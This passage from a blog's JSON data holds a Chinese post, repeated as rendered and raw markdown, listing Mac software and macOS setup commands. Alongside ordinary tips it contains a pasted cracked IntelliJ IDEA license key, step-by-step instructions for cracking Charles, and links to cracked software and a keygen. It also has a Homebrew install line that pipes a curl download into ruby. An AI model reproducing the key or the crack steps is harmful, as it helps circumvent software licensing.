href=\"http://www.jianshu.com/p/a47e96645d88\">XtraFinder在 Mac OS 10.11上使用问题</a></li>\n</ul>\n"},{"title":"Mac装机软件","date":"2015-12-29T09:56:00.000Z","_content":"\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n\n## 一、应用软件\n\n### 1. 安装腾讯电脑管家\n下载地址：http://mac.guanjia.qq.com/\n\n软件下载列表：\n - 百度云同步盘\n - 百度音乐\n - 微信\n - QQ\n - Evernote\n - firefox\n - chrome\n - thunderbird\n - Foxmail\n - Thunder\n - VirtualBox\n - The Unarchiver\n - 搜狗五笔\n - Sublime Text 2(需自行破解，参见：http://myroot.lofter.com/post/15197d_4e94e1)\n - beyond compare(需自行破解)\n - AirDroid\n - iTerm\n - 欧路词典\n - Snip\n\n<!-- more -->\n\n### 2. haroopad\n下载地址：http://pad.haroopress.com/user.html\n\n### 3. Office\n参见：[Microsoft Office 2016 for Mac (15.16) 正式版下载+破解](http://www.macx.cn/thread-2166376-1-1.html)\n\n### 4. MarkEditor\nhttp://zrey.com/app/markeditor\n\n### 5. ichm\n[iChm – CHM 阅读器[Mac]](http://www.appinn.com/ichm/)\n\n### 6. Stand for Mac\n参见：[Stand for Mac – 定时提醒你去休息片刻[OS X]](http://www.appinn.com/stand-for-mac/)\n\n### 7. Go2Shell\n一个可以快速在当前目录打开Shell的工具,小巧,非常好用!\n**注**：XtraFinder可以代替。\n\n参见：[Mac必备神器之Go2Shell以及使用技巧](http://www.jianshu.com/p/88c6e68645c4)\n\n### 8. XtraFinder\n10.9之前，Finder 没有多标签功能，第三方免费软件 XtraFinder 是我的必备软件之一，它除了提供类似 chrome 的多标签形式之外，还增加了一系列非常实用的功能：\n1、向上按钮，可以直接返回上一级目录；\n2、拷贝当前路径，有多种形式的路径可以选择，方便在各种环境下直接粘贴；\n3、从当前位置启动：可以直接在当前路径下打开终端；\n4、文件排序目录靠前：与 Windows 下的习惯保持一致，目录排在文件的最前端；\n等等。\n\n参见：[Finder 功能扩展增强](http://www.macgg.com/archives/16303.html)\n\n### 9. 菜单栏日历\nDay-O 是一款能替代 OS X 菜单栏原生日期时间显示的工具，界面风格与原生系统一样，点击还可以看到日历。\n[Day-O – 菜单栏日历[OS X]](http://www.appinn.com/day-o-for-os-x/)\n\n官网：http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock\n\n另外一款：LunarCal Mac版\nhttp://www.pc6.com/mach/macdtime/\n\n### 10. Cisco AnyConnect Secure Mobility Client\n\n### 11. vpn&relay\nmac软件：Tunnelblick\nwindows软件：OpenVPN\n\n### 12. tuxera ntfs\n自动加载ntfs格式移动设备，并支持读写。\n\n### 13. CheatSheet\n只需长按住 ⌘-command 键就可以显示当前程序的快捷键列表，仅支持 Mac 系统，就这么简单。\n\nCheatSheet 能显示出几乎所有程序的快捷键列表，而列表中的功能，除了可以用快捷键操作，也是可以点的。如果你不喜欢用菜单，用 CheatSheet 来开启功能也是一个不错的办法。\n\n参见：[CheatSheet – 显示当前程序快捷键列表[Mac]](http://www.appinn.com/cheatsheet/)\n\n### 14. HyperDock\nHyperDock是一款可以让你的mac系统的任务栏浏览器图标能像win7系统那样显示当前已打开的网页略缩图，除此之外还可以平均分配画面，往左右一拉可以缺成两个平均画面，网上拉可以变成全屏幕。\n\nHyperDock for Mac 1.5.2 中文破解版百度云盘直接下载：http://pan.baidu.com/s/1pJHv16F\n\n### 15. NoSleep\n一般情况下，在我们使用Macbook苹果笔记本的时候，只要将上盖阖上，电脑就会进入睡眠状态，这样运行的程序以及网络连接都会中断，直到睡眠被唤醒。\n这里推荐一个插件NoSleep-1.4.0.dmg，可以自己控制合上盖子是否睡眠，是不是很赞！\n修改nosleep的设置，勾选开机自动启动，空心图标表示合盖会睡眠，实心图标表示合盖不会睡眠，通过Enable NoSleep切换（也可以通过命令切换/usr/local/bin/NoSleepCtrl -s 1/0，再配合crontab就可以自动开启和关闭）\n\n参见：[NoSleep – 就是不休眠](http://www.appinn.com/nosleep/)\n\n### 16. Clearview\npdf和chm文件查看工具Clearview。\n之前用过几款chm查看工具，如：ichm、xchm，有些chm会出现乱码问题。\n但是，由于是全文内容加载，ClearView打开速度性能略差。\n\n参见：[Clearview 1.9 Mac破解版](http://www.sdifenzhou.com/clearview19.html)\n\n\n### x. 更多应用软件\n参见：[装机必备](http://www.maczapp.com/zjbb)\n\n\n## 二、开发软件\n\n### 1. git\n图形工具：SourceTree\n\n### 2. jdk\n\n### 3. IDE\neclipse，STS\n\n#### IDEA\n破解码：\n```\nC0FHYYCJ22-eyJsaWNlbnNlSWQiOiJDMEZIWVlDSjIyIiwibGljZW5zZWVOYW1lIjoid2VpIGh1YW5nIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IiIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDE2LTAyLTI1IiwicGFpZFVwVG8iOiIyMDE2LTAyLTI1In1dLCJoYXNoIjoiMjE2MDg1MS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-gpr4wd65mz5ExkwIKDiLKA6dGOPpOBBzZyKWUPaTpjUBIGAXFGFcId5tJPK2KeIUDOSbRKOONGm5tI8DL69MtiD22//QDeln5/UO5NBlyEUU352gX6smobx3aC19vjZHPpAkmhZYVyZEmOEAzhDZ8bO/q5u+anxHLRCmV931wBQm7SjnXAhFLRGOEAhOBnw+KxzZF4KCT5GgySK1V4Be7QCegjyvpOKtgVBpIgylnEiZKTMESXiXNNiKMaI+f9JT9ZjQgNlLvZQzXWl5GGNg/689wZ45OMZtg2HAoATh6f7VMWfbFMqZOu8xrTjEEwlt9KG8apzTdtM7lnSSZ4p5eQ==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==\n```\n\n参见：\n - [IntelliJ IDEA 14 注册码](http://hw1287789687.iteye.com/blog/2153894)\n - [IntelliJ IDEA 14 在线注册机](http://inhu.net/intellij-idea-14-keygen.html)\n\n### 4. maven\n\n### 5. securecrt\n注册的主机配置路径：cd ~/Library/Application\\ Support/VanDyke/SecureCRT/Config/Sessions/\n\n参见：\n - [Mac下面的SecureCRT(附破解方案) 更新到最新的7.2](http://bbs.feng.com/read-htm-tid-6939481.html)\n - 评论[Mac下面的SecureCRT(附破解方案) 更新到最新的7.3.2](http://blog.csdn.net/skykingf/article/details/17450561)\n\n### 6. redis desktop manager\n\n### 7. mysql\n下载：mysql-5.6.27-osx10.9-x86_64.dmg\n正常安装，默认无密码。\n\n更改mysql root密码：\n``` shell\ncd /usr/local/mysql-5.6.27-osx10.8-x86_64/bin\nsudo ./mysqld_safe\n./mysqladmin -u root password 新密码\n```\n\n参见：\n - [MySQL for Mac 安装和基本操作(包含后期的环境变量设置)](http://2484055.blog.51cto.com/2474055/1335382)\n - [MySQLStartupItem.pkg missing from MySQL DMG](http://stackoverflow.com/questions/26110314/mysqlstartupitem-pkg-missing-from-mysql-dmg)\n\n### 8. mysql workbench\n\n### 9. JD-GUI\njava class反编译工具\n\n### 10. charles\n简单说明下Charles的破解方法：\n1.打开dmg镜像，将“Charles.app”拖入应用程序中；\n2.打开应用程序—右键“Charles.app”显示包内容—Contents—Java；\n3.将dmg镜像包内的“charles.jar”替换覆盖到第二步的Java文件夹中；\n4.打开“Charles.app”，等待30秒，菜单栏中找到“Help”—“Register…”，输入任意信息完成注册；\n5.Have done！\n\n系统版本要求：OS X 10.7 或更高。\n参见：[Charles 4.0 Mac破解版](http://www.sdifenzhou.com/charles4.html)\n\n\n## 三、系统配置\n\n### 1. 截图快捷键\nCmd+Shift+3：全屏截图；截取整个屏幕，保存截图至桌面文件夹。\nCmd+Shift+4：区域截图；鼠标光标变成带坐标的小十字，通过拖拽截取特定区域，保存截图至桌面文件夹。\nCmd+Shift+4：单击空格键 - 鼠标单击指定窗口：窗口截图；出现小十字光标后对指定窗口按空格键，鼠标光标变成照相机，鼠标单击截取指定窗口，保存截图至桌面文件夹。\n参见：[OS X 系统自带的截图快捷键有哪些？](http://www.zhihu.com/question/19550327/answer/12222576)\n\n### 2. 时间显示设置\n右上角托盘设置。\n![mac时间显示设置](http://7xkl4i.com1.z0.glb.clouddn.com/mac时间显示设置.png)\n\n### 3. 更改功能键行为\n![mac更改功能键行为](http://7xkl4i.com1.z0.glb.clouddn.com/mac更改功能键行为.png)\n\n如果希望将顶部一行按键用作标准功能键（而不执行图标指示的特殊功能），但又不想按 Fn 键，请执行以下操作：\n（1）从 Apple 菜单中，选取系统偏好设置。\n（2）从显示菜单中，选取键盘（在 Mac OS X v10.5.8 或更早版本中，则为键盘与鼠标）。\n（3）点按“键盘”（如果需要的话）。\n（4）启用“将 F1、F2 等键用作标准功能键”。\n启用此选项时，顶部一行按键将用作标准功能键 (F1 - F12)，而不执行音量控制等特殊功能。启用此选项后，若要使用任一上述按键上所印图标指示的功能，请按 Fn。例如，如果启用了上述选项，请按 Fn-F10 来开关静音功能。\n\n参见：[Mac OS X：如何更改功能键的行为](https://support.apple.com/zh-cn/HT3399)\n\n### 4. 申请Apple ID\n到App Store里创建\n\n### 5. 文件剪切\n你只需选中目标文件，然后使用 Command+C 复制，然后用 Command +Option+V 将其移动到目标目录。\n\n[Mac 教程：OS X「剪切」移动文件的三种方法](http://sspai.com/28389)\n\n### 6. 显示隐藏文件(未尝试)\nMac 可以用命令行显示默认隐藏的文件：\n``` shell\ndefaults write com.apple.finder AppleShowAllFiles TRUE\nkillall Finder\n```\n\n参见：[ShowOrHide – 开关隐藏文件的显示[Mac]](http://www.appinn.com/showorhide/)\n\n### 7. 新建位于文件夹位置的终端窗口\nhttp://apple.stackexchange.com/a/42450/40485\n\n系统偏好设置 -> 键盘 -> 快捷键 -> 服务，勾选「新建位于文件夹位置的终端窗口」（后面的键盘快捷键可以不选），然后在 Finder 里面选中文件夹右键菜单的「服务」下面就会有「新建位于文件夹位置的终端窗口」这一子菜单了。\n\n参见：[MAC OSX右键菜单能否添加类似于“在终端中打开当前目录”的快捷方式](https://www.v2ex.com/t/81344)\n\n### 8. 打印机\n各公司打印机安装方式不一\n\n### 9. Mac怎么彻底关闭开机声音(粗略尝试不好用)\n关闭开机声音：`sudo nvram SystemAudioVolume=%80`\n恢复开机声音：`sudo nvram -d SystemAudioVolume`\n\n参见：[使用终端命令 关闭Mac电脑开机启动音](http://www.macx.cn/thread-2071828-1-1.html)\n\n### 10. 如何更改 OS X 截图默认保存路径\n``` shell\ndefaults write com.apple.screencapture location ~/Pictures/screenshots/\nkillall SystemUIServer\n```\n\n参见：\n - [更改OS X默认的截图文件名及格式](http://fduo.org/osx-screenshot-settings/)\n - [如何更改 OS X 截图默认保存路径](http://sspai.com/26327)\n\n### 11. Finder标题栏显示当前文件夹路径\n\n#### 标题栏显示当前文件夹路径\n``` shell\ndefaults write com.apple.finder _FXShowPosixPathInTitle -bool TRUE\nkillall Finder\n```\n\n#### 恢复默认设置\n``` shell\ndefaults delete com.apple.finder _FXShowPosixPathInTitle\nkillall Finder\n```\n\n参见：[[Mac]如何在Finder标题栏显示当前文件夹路径？](http://www.macgg.com/archives/7824.html)\n\n### 12. 邮件配置\n各公司邮件服务器配置不一。\n\n\n### 13. 配色\n\n#### 文件列表颜色\n修改.bash_profile 或者 .profile，添加如下内容：\n```\nalias ll=\"ls -al\"\nalias grep='grep --color'\nalias egrep='egrep --color'\nalias fgrep='fgrep --color'\nalias tree=\"find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'\"\n\nexport CLICOLOR=1\nexport LSCOLORS=gxfxaxdxcxegedabagacad\n```\n\n#### vim着色\n修改.vimrc，添加如下内容：\n```\nsyntax on\n```\n\n### 14. brew\n\n#### 安装HomeBrew\n``` shell\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n\n#### 安装Homebrew Cask\n``` shell\nbrew install caskroom/cask/brew-cask\n```\n\n\n### 15. tree\n``` shell\nbrew install tree\n```\n\n### 16. wget\n``` shell\nbrew install wget\n```\n\n\n### 17. 禁止修改文件扩展名的警告\n**借助终端**\n``` bash\ndefaults write com.apple.finder FXEnableExtensionChangeWarning -bool false\nkillall Finder\n```\n\n**界面设置**\n> 其实只要直接在 Finder 中按＂⌘,＂进入 Preferences，然后选择 “Advanced” – 取消 “Show warning before changing an extension” 前面的勾就可以了。\n\n参见：[OS X 小技巧 – 禁止修改文件扩展名的警告[Mac]](http://www.appinn.com/disablefile-extension-warning/)\n","source":"_posts/article/mac/Mac装机软件.md","raw":"title: Mac装机软件\ntags:\n  - 小记\n  - mac\n  - 装机\ncategories:\n  - 工具软件\ndate: 2015-12-29 17:56:00\n---\n\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n\n## 一、应用软件\n\n### 1. 安装腾讯电脑管家\n下载地址：http://mac.guanjia.qq.com/\n\n软件下载列表：\n - 百度云同步盘\n - 百度音乐\n - 微信\n - QQ\n - Evernote\n - firefox\n - chrome\n - thunderbird\n - Foxmail\n - Thunder\n - VirtualBox\n - The Unarchiver\n - 搜狗五笔\n - Sublime Text 2(需自行破解，参见：http://myroot.lofter.com/post/15197d_4e94e1)\n - beyond compare(需自行破解)\n - AirDroid\n - iTerm\n - 欧路词典\n - Snip\n\n<!-- more -->\n\n### 2. haroopad\n下载地址：http://pad.haroopress.com/user.html\n\n### 3. Office\n参见：[Microsoft Office 2016 for Mac (15.16) 正式版下载+破解](http://www.macx.cn/thread-2166376-1-1.html)\n\n### 4. MarkEditor\nhttp://zrey.com/app/markeditor\n\n### 5. ichm\n[iChm – CHM 阅读器[Mac]](http://www.appinn.com/ichm/)\n\n### 6. Stand for Mac\n参见：[Stand for Mac – 定时提醒你去休息片刻[OS X]](http://www.appinn.com/stand-for-mac/)\n\n### 7. Go2Shell\n一个可以快速在当前目录打开Shell的工具,小巧,非常好用!\n**注**：XtraFinder可以代替。\n\n参见：[Mac必备神器之Go2Shell以及使用技巧](http://www.jianshu.com/p/88c6e68645c4)\n\n### 8. XtraFinder\n10.9之前，Finder 没有多标签功能，第三方免费软件 XtraFinder 是我的必备软件之一，它除了提供类似 chrome 的多标签形式之外，还增加了一系列非常实用的功能：\n1、向上按钮，可以直接返回上一级目录；\n2、拷贝当前路径，有多种形式的路径可以选择，方便在各种环境下直接粘贴；\n3、从当前位置启动：可以直接在当前路径下打开终端；\n4、文件排序目录靠前：与 Windows 下的习惯保持一致，目录排在文件的最前端；\n等等。\n\n参见：[Finder 功能扩展增强](http://www.macgg.com/archives/16303.html)\n\n### 9. 菜单栏日历\nDay-O 是一款能替代 OS X 菜单栏原生日期时间显示的工具，界面风格与原生系统一样，点击还可以看到日历。\n[Day-O – 菜单栏日历[OS X]](http://www.appinn.com/day-o-for-os-x/)\n\n官网：http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock\n\n另外一款：LunarCal Mac版\nhttp://www.pc6.com/mach/macdtime/\n\n### 10. Cisco AnyConnect Secure Mobility Client\n\n### 11. vpn&relay\nmac软件：Tunnelblick\nwindows软件：OpenVPN\n\n### 12. tuxera ntfs\n自动加载ntfs格式移动设备，并支持读写。\n\n### 13. CheatSheet\n只需长按住 ⌘-command 键就可以显示当前程序的快捷键列表，仅支持 Mac 系统，就这么简单。\n\nCheatSheet 能显示出几乎所有程序的快捷键列表，而列表中的功能，除了可以用快捷键操作，也是可以点的。如果你不喜欢用菜单，用 CheatSheet 来开启功能也是一个不错的办法。\n\n参见：[CheatSheet – 显示当前程序快捷键列表[Mac]](http://www.appinn.com/cheatsheet/)\n\n### 14. HyperDock\nHyperDock是一款可以让你的mac系统的任务栏浏览器图标能像win7系统那样显示当前已打开的网页略缩图，除此之外还可以平均分配画面，往左右一拉可以缺成两个平均画面，网上拉可以变成全屏幕。\n\nHyperDock for Mac 1.5.2 中文破解版百度云盘直接下载：http://pan.baidu.com/s/1pJHv16F\n\n### 15. NoSleep\n一般情况下，在我们使用Macbook苹果笔记本的时候，只要将上盖阖上，电脑就会进入睡眠状态，这样运行的程序以及网络连接都会中断，直到睡眠被唤醒。\n这里推荐一个插件NoSleep-1.4.0.dmg，可以自己控制合上盖子是否睡眠，是不是很赞！\n修改nosleep的设置，勾选开机自动启动，空心图标表示合盖会睡眠，实心图标表示合盖不会睡眠，通过Enable NoSleep切换（也可以通过命令切换/usr/local/bin/NoSleepCtrl -s 1/0，再配合crontab就可以自动开启和关闭）\n\n参见：[NoSleep – 就是不休眠](http://www.appinn.com/nosleep/)\n\n### 16. Clearview\npdf和chm文件查看工具Clearview。\n之前用过几款chm查看工具，如：ichm、xchm，有些chm会出现乱码问题。\n但是，由于是全文内容加载，ClearView打开速度性能略差。\n\n参见：[Clearview 1.9 Mac破解版](http://www.sdifenzhou.com/clearview19.html)\n\n\n### x. 更多应用软件\n参见：[装机必备](http://www.maczapp.com/zjbb)\n\n\n## 二、开发软件\n\n### 1. git\n图形工具：SourceTree\n\n### 2. jdk\n\n### 3. IDE\neclipse，STS\n\n#### IDEA\n破解码：\n```\nC0FHYYCJ22-eyJsaWNlbnNlSWQiOiJDMEZIWVlDSjIyIiwibGljZW5zZWVOYW1lIjoid2VpIGh1YW5nIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IiIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDE2LTAyLTI1IiwicGFpZFVwVG8iOiIyMDE2LTAyLTI1In1dLCJoYXNoIjoiMjE2MDg1MS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-gpr4wd65mz5ExkwIKDiLKA6dGOPpOBBzZyKWUPaTpjUBIGAXFGFcId5tJPK2KeIUDOSbRKOONGm5tI8DL69MtiD22//QDeln5/UO5NBlyEUU352gX6smobx3aC19vjZHPpAkmhZYVyZEmOEAzhDZ8bO/q5u+anxHLRCmV931wBQm7SjnXAhFLRGOEAhOBnw+KxzZF4KCT5GgySK1V4Be7QCegjyvpOKtgVBpIgylnEiZKTMESXiXNNiKMaI+f9JT9ZjQgNlLvZQzXWl5GGNg/689wZ45OMZtg2HAoATh6f7VMWfbFMqZOu8xrTjEEwlt9KG8apzTdtM7lnSSZ4p5eQ==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==\n```\n\n参见：\n - [IntelliJ IDEA 14 注册码](http://hw1287789687.iteye.com/blog/2153894)\n - [IntelliJ IDEA 14 在线注册机](http://inhu.net/intellij-idea-14-keygen.html)\n\n### 4. maven\n\n### 5. securecrt\n注册的主机配置路径：cd ~/Library/Application\\ Support/VanDyke/SecureCRT/Config/Sessions/\n\n参见：\n - [Mac下面的SecureCRT(附破解方案) 更新到最新的7.2](http://bbs.feng.com/read-htm-tid-6939481.html)\n - 评论[Mac下面的SecureCRT(附破解方案) 更新到最新的7.3.2](http://blog.csdn.net/skykingf/article/details/17450561)\n\n### 6. redis desktop manager\n\n### 7. mysql\n下载：mysql-5.6.27-osx10.9-x86_64.dmg\n正常安装，默认无密码。\n\n更改mysql root密码：\n``` shell\ncd /usr/local/mysql-5.6.27-osx10.8-x86_64/bin\nsudo ./mysqld_safe\n./mysqladmin -u root password 新密码\n```\n\n参见：\n - [MySQL for Mac 安装和基本操作(包含后期的环境变量设置)](http://2484055.blog.51cto.com/2474055/1335382)\n - [MySQLStartupItem.pkg missing from MySQL DMG](http://stackoverflow.com/questions/26110314/mysqlstartupitem-pkg-missing-from-mysql-dmg)\n\n### 8. mysql workbench\n\n### 9. JD-GUI\njava class反编译工具\n\n### 10. charles\n简单说明下Charles的破解方法：\n1.打开dmg镜像，将“Charles.app”拖入应用程序中；\n2.打开应用程序—右键“Charles.app”显示包内容—Contents—Java；\n3.将dmg镜像包内的“charles.jar”替换覆盖到第二步的Java文件夹中；\n4.打开“Charles.app”，等待30秒，菜单栏中找到“Help”—“Register…”，输入任意信息完成注册；\n5.Have done！\n\n系统版本要求：OS X 10.7 或更高。\n参见：[Charles 4.0 Mac破解版](http://www.sdifenzhou.com/charles4.html)\n\n\n## 三、系统配置\n\n### 1. 截图快捷键\nCmd+Shift+3：全屏截图；截取整个屏幕，保存截图至桌面文件夹。\nCmd+Shift+4：区域截图；鼠标光标变成带坐标的小十字，通过拖拽截取特定区域，保存截图至桌面文件夹。\nCmd+Shift+4：单击空格键 - 鼠标单击指定窗口：窗口截图；出现小十字光标后对指定窗口按空格键，鼠标光标变成照相机，鼠标单击截取指定窗口，保存截图至桌面文件夹。\n参见：[OS X 系统自带的截图快捷键有哪些？](http://www.zhihu.com/question/19550327/answer/12222576)\n\n### 2. 时间显示设置\n右上角托盘设置。\n![mac时间显示设置](http://7xkl4i.com1.z0.glb.clouddn.com/mac时间显示设置.png)\n\n### 3. 更改功能键行为\n![mac更改功能键行为](http://7xkl4i.com1.z0.glb.clouddn.com/mac更改功能键行为.png)\n\n如果希望将顶部一行按键用作标准功能键（而不执行图标指示的特殊功能），但又不想按 Fn 键，请执行以下操作：\n（1）从 Apple 菜单中，选取系统偏好设置。\n（2）从显示菜单中，选取键盘（在 Mac OS X v10.5.8 或更早版本中，则为键盘与鼠标）。\n（3）点按“键盘”（如果需要的话）。\n（4）启用“将 F1、F2 等键用作标准功能键”。\n启用此选项时，顶部一行按键将用作标准功能键 (F1 - F12)，而不执行音量控制等特殊功能。启用此选项后，若要使用任一上述按键上所印图标指示的功能，请按 Fn。例如，如果启用了上述选项，请按 Fn-F10 来开关静音功能。\n\n参见：[Mac OS X：如何更改功能键的行为](https://support.apple.com/zh-cn/HT3399)\n\n### 4. 申请Apple ID\n到App Store里创建\n\n### 5. 文件剪切\n你只需选中目标文件，然后使用 Command+C 复制，然后用 Command +Option+V 将其移动到目标目录。\n\n[Mac 教程：OS X「剪切」移动文件的三种方法](http://sspai.com/28389)\n\n### 6. 显示隐藏文件(未尝试)\nMac 可以用命令行显示默认隐藏的文件：\n``` shell\ndefaults write com.apple.finder AppleShowAllFiles TRUE\nkillall Finder\n```\n\n参见：[ShowOrHide – 开关隐藏文件的显示[Mac]](http://www.appinn.com/showorhide/)\n\n### 7. 新建位于文件夹位置的终端窗口\nhttp://apple.stackexchange.com/a/42450/40485\n\n系统偏好设置 -> 键盘 -> 快捷键 -> 服务，勾选「新建位于文件夹位置的终端窗口」（后面的键盘快捷键可以不选），然后在 Finder 里面选中文件夹右键菜单的「服务」下面就会有「新建位于文件夹位置的终端窗口」这一子菜单了。\n\n参见：[MAC OSX右键菜单能否添加类似于“在终端中打开当前目录”的快捷方式](https://www.v2ex.com/t/81344)\n\n### 8. 打印机\n各公司打印机安装方式不一\n\n### 9. Mac怎么彻底关闭开机声音(粗略尝试不好用)\n关闭开机声音：`sudo nvram SystemAudioVolume=%80`\n恢复开机声音：`sudo nvram -d SystemAudioVolume`\n\n参见：[使用终端命令 关闭Mac电脑开机启动音](http://www.macx.cn/thread-2071828-1-1.html)\n\n### 10. 如何更改 OS X 截图默认保存路径\n``` shell\ndefaults write com.apple.screencapture location ~/Pictures/screenshots/\nkillall SystemUIServer\n```\n\n参见：\n - [更改OS X默认的截图文件名及格式](http://fduo.org/osx-screenshot-settings/)\n - [如何更改 OS X 截图默认保存路径](http://sspai.com/26327)\n\n### 11. Finder标题栏显示当前文件夹路径\n\n#### 标题栏显示当前文件夹路径\n``` shell\ndefaults write com.apple.finder _FXShowPosixPathInTitle -bool TRUE\nkillall Finder\n```\n\n#### 恢复默认设置\n``` shell\ndefaults delete com.apple.finder _FXShowPosixPathInTitle\nkillall Finder\n```\n\n参见：[[Mac]如何在Finder标题栏显示当前文件夹路径？](http://www.macgg.com/archives/7824.html)\n\n### 12. 邮件配置\n各公司邮件服务器配置不一。\n\n\n### 13. 配色\n\n#### 